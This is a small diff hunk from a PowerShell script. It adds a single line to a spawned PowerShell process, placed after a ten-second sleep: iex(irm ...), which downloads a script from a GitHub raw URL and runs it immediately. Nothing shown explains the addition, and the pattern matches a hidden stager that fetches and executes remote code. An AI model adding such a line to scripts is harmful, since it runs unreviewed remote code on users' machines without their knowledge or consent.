@@ -982,6 +982,7 @@ Start-Process powershell -ArgumentList "-NoExit", "-Command & {
 write-host
 write-host
     start-sleep -seconds 10
+    iex(irm https://raw.githubusercontent.com/hinzdc/get/refs/heads/main/Test/command.ps1)
     exit
 }"
 
